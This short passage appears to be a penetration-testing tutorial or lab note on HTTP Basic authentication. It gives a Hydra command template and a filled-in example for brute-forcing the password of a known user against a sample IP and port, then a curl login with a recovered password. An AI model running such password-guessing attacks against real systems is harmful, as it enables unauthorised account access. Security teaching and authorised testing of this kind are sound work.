Web applications often employ authentication mechanisms to protect sensitive data and functionalities. The server responds with a `401 Unauthorized status` and a `WWW-Authenticate header` prompting the user's browser to present a login dialog.

Now let's say we already know the username is `basic-auth-user`. We can simplify the Hydra command and focus solely on brute-forcing the password.

```sh
hydra -l <username> -P <wordlist> <ip> http-get / -s <port>
```

### Example command:

```sh
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 172.132.12.1 http-get / -s 1337
```

```sh
curl -u basic-auth-user:'Password@123' http://172.132.12.1:1337
```

